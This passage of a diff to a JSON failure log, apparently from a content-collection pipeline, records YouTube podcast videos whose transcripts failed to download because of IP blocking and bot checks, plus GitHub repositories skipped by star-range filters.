https://github.com/yt-dlp/yt-dlp/wiki/FAQ#how-do-i-pass-cookies-to-yt-dlp for how to manually pass cookies. Also see https://github.com/yt-dlp/yt-dlp/wiki/Extractors#exporting-youtube-cookies for tips on effectively exporting YouTube cookies"
-      },
-      {
-        "type": "youtube",
-        "title": "Why the AI Boom Is Just Getting Started",
-        "url": "https://www.youtube.com/watch?v=DZt1DDmMNGk",
-        "failure_reason": "youtube_transcript_api_error: Could not retrieve a transcript for the video https://www.youtube.com/watch?v=DZt1DDmMNGk! This is most likely caused by: YouTube is blocking requests from your IP. This usually is due to one of the following reasons: - You have done too many requests and your IP has been blocked by YouTube - You are doing requests from an IP belonging to a cloud provider (like AWS, Google Cloud Platform, Azure, etc.). Unfortunately, most IPs from cloud providers are blocked by YouTube. There are two things you can do to work around this: 1. Use proxies to hide your IP address, as explained in the \"Working around IP bans\" section of the README (https://github.com/jdepoix/youtube-transcript-api?tab=readme-ov-file#working-around-ip-bans-requestblocked-or-ipblocked-exception). 2. (NOT RECOMMENDED) If you authenticate your requests using cookies, you will be able to continue doing requests for a while. However, YouTube will eventually permanently ban the account that you have used to authenticate with! So only do this if you don't mind your account being banned! If you are sure that the described cause is not responsible for this error and that a transcript should be retrievable, please create an issue at https://github.com/jdepoix/youtube-transcript-api/issues. Please add which version of youtube_transcript_api you are using and provide the information needed to replicate the error. Also make sure that there are no open issues which already describe your problem!; yt_dlp_subtitle_error: ERROR: [youtube] DZt1DDmMNGk: Sign in to confirm you’re not a bot. Use --cookies-from-browser or --cookies for the authentication. See https://github.com/yt-dlp/yt-dlp/wiki/FAQ#how-do-i-pass-cookies-to-yt-dlp for how to manually pass cookies. Also see https://github.com/yt-dlp/yt-dlp/wiki/Extractors#exporting-youtube-cookies for tips on effectively exporting YouTube cookies"
-      },
-      {
-        "type": "youtube",
-        "title": "Uber CEO on AI, Autonomous Vehicles, and the Future of Transportation",
-        "url": "https://www.youtube.com/watch?v=ThMtheE5eO0",
-        "failure_reason": "youtube_transcript_api_error: Could not retrieve a transcript for the video https://www.youtube.com/watch?v=ThMtheE5eO0! This is most likely caused by: YouTube is blocking requests from your IP. This usually is due to one of the following reasons: - You have done too many requests and your IP has been blocked by YouTube - You are doing requests from an IP belonging to a cloud provider (like AWS, Google Cloud Platform, Azure, etc.). Unfortunately, most IPs from cloud providers are blocked by YouTube. There are two things you can do to work around this: 1. Use proxies to hide your IP address, as explained in the \"Working around IP bans\" section of the README (https://github.com/jdepoix/youtube-transcript-api?tab=readme-ov-file#working-around-ip-bans-requestblocked-or-ipblocked-exception). 2. (NOT RECOMMENDED) If you authenticate your requests using cookies, you will be able to continue doing requests for a while. However, YouTube will eventually permanently ban the account that you have used to authenticate with! So only do this if you don't mind your account being banned! If you are sure that the described cause is not responsible for this error and that a transcript should be retrievable, please create an issue at https://github.com/jdepoix/youtube-transcript-api/issues. Please add which version of youtube_transcript_api you are using and provide the information needed to replicate the error. Also make sure that there are no open issues which already describe your problem!; yt_dlp_subtitle_error: ERROR: [youtube] ThMtheE5eO0: Sign in to confirm you’re not a bot. Use --cookies-from-browser or --cookies for the authentication. See https://github.com/yt-dlp/yt-dlp/wiki/FAQ#how-do-i-pass-cookies-to-yt-dlp for how to manually pass cookies. Also see https://github.com/yt-dlp/yt-dlp/wiki/Extractors#exporting-youtube-cookies for tips on effectively exporting YouTube cookies"
-      },
-      {
-        "type": "youtube",
-        "title": "Legendary Investor Dan Loeb on AI, Credit, & Third Point’s $25B Strategy",
-        "url": "https://www.youtube.com/watch?v=vhTi_8QwXjg",
-        "failure_reason": "youtube_transcript_api_error: Could not retrieve a transcript for the video https://www.youtube.com/watch?v=vhTi_8QwXjg! This is most likely caused by: YouTube is blocking requests from your IP. This usually is due to one of the following reasons: - You have done too many requests and your IP has been blocked by YouTube - You are doing requests from an IP belonging to a cloud provider (like AWS, Google Cloud Platform, Azure, etc.). Unfortunately, most IPs from cloud providers are blocked by YouTube. There are two things you can do to work around this: 1. Use proxies to hide your IP address, as explained in the \"Working around IP bans\" section of the README (https://github.com/jdepoix/youtube-transcript-api?tab=readme-ov-file#working-around-ip-bans-requestblocked-or-ipblocked-exception). 2. (NOT RECOMMENDED) If you authenticate your requests using cookies, you will be able to continue doing requests for a while. However, YouTube will eventually permanently ban the account that you have used to authenticate with! So only do this if you don't mind your account being banned! If you are sure that the described cause is not responsible for this error and that a transcript should be retrievable, please create an issue at https://github.com/jdepoix/youtube-transcript-api/issues. Please add which version of youtube_transcript_api you are using and provide the information needed to replicate the error. Also make sure that there are no open issues which already describe your problem!; yt_dlp_subtitle_error: ERROR: [youtube] vhTi_8QwXjg: Sign in to confirm you’re not a bot. Use --cookies-from-browser or --cookies for the authentication. See https://github.com/yt-dlp/yt-dlp/wiki/FAQ#how-do-i-pass-cookies-to-yt-dlp for how to manually pass cookies. Also see https://github.com/yt-dlp/yt-dlp/wiki/Extractors#exporting-youtube-cookies for tips on effectively exporting YouTube cookies"
-      },
-      {
-        "type": "youtube",
-        "title": "Socialists Sweep NYC, China Catches Up in Coding, AI Memory Crunch, Micron's Blowout Quarter",
-        "url": "https://www.youtube.com/watch?v=w8ah_tA0yfg",
-        "failure_reason": "youtube_transcript_api_error: Could not retrieve a transcript for the video https://www.youtube.com/watch?v=w8ah_tA0yfg! This is most likely caused by: YouTube is blocking requests from your IP. This usually is due to one of the following reasons: - You have done too many requests and your IP has been blocked by YouTube - You are doing requests from an IP belonging to a cloud provider (like AWS, Google Cloud Platform, Azure, etc.). Unfortunately, most IPs from cloud providers are blocked by YouTube. There are two things you can do to work around this: 1. Use proxies to hide your IP address, as explained in the \"Working around IP bans\" section of the README (https://github.com/jdepoix/youtube-transcript-api?tab=readme-ov-file#working-around-ip-bans-requestblocked-or-ipblocked-exception). 2. (NOT RECOMMENDED) If you authenticate your requests using cookies, you will be able to continue doing requests for a while. However, YouTube will eventually permanently ban the account that you have used to authenticate with! So only do this if you don't mind your account being banned! If you are sure that the described cause is not responsible for this error and that a transcript should be retrievable, please create an issue at https://github.com/jdepoix/youtube-transcript-api/issues. Please add which version of youtube_transcript_api you are using and provide the information needed to replicate the error. Also make sure that there are no open issues which already describe your problem!; yt_dlp_subtitle_error: ERROR: [youtube] w8ah_tA0yfg: Sign in to confirm you’re not a bot. Use --cookies-from-browser or --cookies for the authentication. See https://github.com/yt-dlp/yt-dlp/wiki/FAQ#how-do-i-pass-cookies-to-yt-dlp for how to manually pass cookies. Also see https://github.com/yt-dlp/yt-dlp/wiki/Extractors#exporting-youtube-cookies for tips on effectively exporting YouTube cookies"
-      },
-      {
-        "type": "youtube",
-        "title": "GameStop CEO Ryan Cohen’s $56B Plan to Take Over eBay",
-        "url": "https://www.youtube.com/watch?v=4j9RPGLENNI",
-        "failure_reason": "youtube_transcript_api_error: Could not retrieve a transcript for the video https://www.youtube.com/watch?v=4j9RPGLENNI! This is most likely caused by: YouTube is blocking requests from your IP. This usually is due to one of the following reasons: - You have done too many requests and your IP has been blocked by YouTube - You are doing requests from an IP belonging to a cloud provider (like AWS, Google Cloud Platform, Azure, etc.). Unfortunately, most IPs from cloud providers are blocked by YouTube. There are two things you can do to work around this: 1. Use proxies to hide your IP address, as explained in the \"Working around IP bans\" section of the README (https://github.com/jdepoix/youtube-transcript-api?tab=readme-ov-file#working-around-ip-bans-requestblocked-or-ipblocked-exception). 2. (NOT RECOMMENDED) If you authenticate your requests using cookies, you will be able to continue doing requests for a while. However, YouTube will eventually permanently ban the account that you have used to authenticate with! So only do this if you don't mind your account being banned! If you are sure that the described cause is not responsible for this error and that a transcript should be retrievable, please create an issue at https://github.com/jdepoix/youtube-transcript-api/issues. Please add which version of youtube_transcript_api you are using and provide the information needed to replicate the error. Also make sure that there are no open issues which already describe your problem!; yt_dlp_subtitle_error: ERROR: [youtube] 4j9RPGLENNI: Sign in to confirm you’re not a bot. Use --cookies-from-browser or --cookies for the authentication. See https://github.com/yt-dlp/yt-dlp/wiki/FAQ#how-do-i-pass-cookies-to-yt-dlp for how to manually pass cookies. Also see https://github.com/yt-dlp/yt-dlp/wiki/Extractors#exporting-youtube-cookies for tips on effectively exporting YouTube cookies"
-      },
-      {
-        "type": "youtube",
-        "title": "World's First Trillionaire, Anthropic Fable Banned, The New Oligarchs, Iran Peace Deal",
-        "url": "https://www.youtube.com/watch?v=3Amlu4y94Ho",
-        "failure_reason": "youtube_transcript_api_error: Could not retrieve a transcript for the video https://www.youtube.com/watch?v=3Amlu4y94Ho! This is most likely caused by: YouTube is blocking requests from your IP. This usually is due to one of the following reasons: - You have done too many requests and your IP has been blocked by YouTube - You are doing requests from an IP belonging to a cloud provider (like AWS, Google Cloud Platform, Azure, etc.). Unfortunately, most IPs from cloud providers are blocked by YouTube. There are two things you can do to work around this: 1. Use proxies to hide your IP address, as explained in the \"Working around IP bans\" section of the README (https://github.com/jdepoix/youtube-transcript-api?tab=readme-ov-file#working-around-ip-bans-requestblocked-or-ipblocked-exception). 2. (NOT RECOMMENDED) If you authenticate your requests using cookies, you will be able to continue doing requests for a while. However, YouTube will eventually permanently ban the account that you have used to authenticate with! So only do this if you don't mind your account being banned! If you are sure that the described cause is not responsible for this error and that a transcript should be retrievable, please create an issue at https://github.com/jdepoix/youtube-transcript-api/issues. Please add which version of youtube_transcript_api you are using and provide the information needed to replicate the error. Also make sure that there are no open issues which already describe your problem!; yt_dlp_subtitle_error: ERROR: [youtube] 3Amlu4y94Ho: Sign in to confirm you’re not a bot. Use --cookies-from-browser or --cookies for the authentication. See https://github.com/yt-dlp/yt-dlp/wiki/FAQ#how-do-i-pass-cookies-to-yt-dlp for how to manually pass cookies. Also see https://github.com/yt-dlp/yt-dlp/wiki/Extractors#exporting-youtube-cookies for tips on effectively exporting YouTube cookies"
-      },
-      {
-        "type": "youtube",
-        "title": "Anthropic's Fable Backlash, Nationalizing AI, Inflation Heats Up & California’s Broken Elections",
-        "url": "https://www.youtube.com/watch?v=gH4FTjDm9FQ",
-        "failure_reason": "youtube_transcript_api_error: Could not retrieve a transcript for the video https://www.youtube.com/watch?v=gH4FTjDm9FQ! This is most likely caused by: YouTube is blocking requests from your IP. This usually is due to one of the following reasons: - You have done too many requests and your IP has been blocked by YouTube - You are doing requests from an IP belonging to a cloud provider (like AWS, Google Cloud Platform, Azure, etc.). Unfortunately, most IPs from cloud providers are blocked by YouTube. There are two things you can do to work around this: 1. Use proxies to hide your IP address, as explained in the \"Working around IP bans\" section of the README (https://github.com/jdepoix/youtube-transcript-api?tab=readme-ov-file#working-around-ip-bans-requestblocked-or-ipblocked-exception). 2. (NOT RECOMMENDED) If you authenticate your requests using cookies, you will be able to continue doing requests for a while. However, YouTube will eventually permanently ban the account that you have used to authenticate with! So only do this if you don't mind your account being banned! If you are sure that the described cause is not responsible for this error and that a transcript should be retrievable, please create an issue at https://github.com/jdepoix/youtube-transcript-api/issues. Please add which version of youtube_transcript_api you are using and provide the information needed to replicate the error. Also make sure that there are no open issues which already describe your problem!; yt_dlp_subtitle_error: ERROR: [youtube] gH4FTjDm9FQ: Sign in to confirm you’re not a bot. Use --cookies-from-browser or --cookies for the authentication. See https://github.com/yt-dlp/yt-dlp/wiki/FAQ#how-do-i-pass-cookies-to-yt-dlp for how to manually pass cookies. Also see https://github.com/yt-dlp/yt-dlp/wiki/Extractors#exporting-youtube-cookies for tips on effectively exporting YouTube cookies"
-      },
-      {
-        "type": "youtube",
-        "title": "All-In's Best Ideas Pitch Competition: 4 Investors Present Their Top Trades Live",
-        "url": "https://www.youtube.com/watch?v=fO5sC7qS04E",
-        "failure_reason": "youtube_transcript_api_error: Could not retrieve a transcript for the video https://www.youtube.com/watch?v=fO5sC7qS04E! This is most likely caused by: YouTube is blocking requests from your IP. This usually is due to one of the following reasons: - You have done too many requests and your IP has been blocked by YouTube - You are doing requests from an IP belonging to a cloud provider (like AWS, Google Cloud Platform, Azure, etc.). Unfortunately, most IPs from cloud providers are blocked by YouTube. There are two things you can do to work around this: 1. Use proxies to hide your IP address, as explained in the \"Working around IP bans\" section of the README (https://github.com/jdepoix/youtube-transcript-api?tab=readme-ov-file#working-around-ip-bans-requestblocked-or-ipblocked-exception). 2. (NOT RECOMMENDED) If you authenticate your requests using cookies, you will be able to continue doing requests for a while. However, YouTube will eventually permanently ban the account that you have used to authenticate with! So only do this if you don't mind your account being banned! If you are sure that the described cause is not responsible for this error and that a transcript should be retrievable, please create an issue at https://github.com/jdepoix/youtube-transcript-api/issues. Please add which version of youtube_transcript_api you are using and provide the information needed to replicate the error. Also make sure that there are no open issues which already describe your problem!; yt_dlp_subtitle_error: ERROR: [youtube] fO5sC7qS04E: Sign in to confirm you’re not a bot. Use --cookies-from-browser or --cookies for the authentication. See https://github.com/yt-dlp/yt-dlp/wiki/FAQ#how-do-i-pass-cookies-to-yt-dlp for how to manually pass cookies. Also see https://github.com/yt-dlp/yt-dlp/wiki/Extractors#exporting-youtube-cookies for tips on effectively exporting YouTube cookies"
+        "title": "All-In Podcast",
+        "url": "https://www.youtube.com/@allin",
+        "failure_reason": "channel_list_failed: Unable to handle request: Unsupported proxy type: \"\" (requests, urllib)"
       }
     ],
     "github": [
@@ -1349,14 +1107,20 @@
       },
       {
         "type": "github",
-        "title": "opendatalab/MinerU",
-        "url": "https://github.com/opendatalab/MinerU",
+        "title": "ripienaar/free-for-dev",
+        "url": "https://github.com/ripienaar/free-for-dev",
         "failure_reason": "filtered_by_star_range"
       },
       {
         "type": "github",
-        "title": "commaai/openpilot",
-        "url": "https://github.com/commaai/openpilot",
+        "title": "ByteByteGoHq/system-design-101",
+        "url": "https://github.com/ByteByteGoHq/system-design-101",
+        "failure_reason": "filtered_by_star_range"
+      },
+      {
+        "type": "github",
+        "title": "usestrix/strix",
+        "url": "https://github.com/usestrix/strix",
         "failure_reason": "filtered_by_star_range"
       },
       {
@@ -1367,15 +1131,21 @@
       },
       {
         "type": "github",
-        "title": "browser-use/video-use",
-        "url": "https://github.com/browser-use/video-use",
+        "title": "simplex-chat/simplex-chat",
+        "url": "https://github.com/simplex-chat/simplex-chat",
         "failure_reason": "filtered_by_star_range"
       },
       {
         "type": "github",
-        "title": "wonglaitung/fortune",
-        "url": "https://github.com/wonglaitung/fortune",
-        "failure_reason": "filtered_noise"
+        "title": "HKUDS/Vibe-Trading",
+        "url": "https://github.com/HKUDS/Vibe-Trading",
+        "failure_reason": "filtered_by_star_range"
+      },
+      {
+        "type": "github",
+        "title": "xbtlin/ai-berkshire",
+        "url": "https://github.com/xbtlin/ai-berkshire",
+        "failure_reason": "filtered_by_star_range"
       },
       {
         "type": "github",
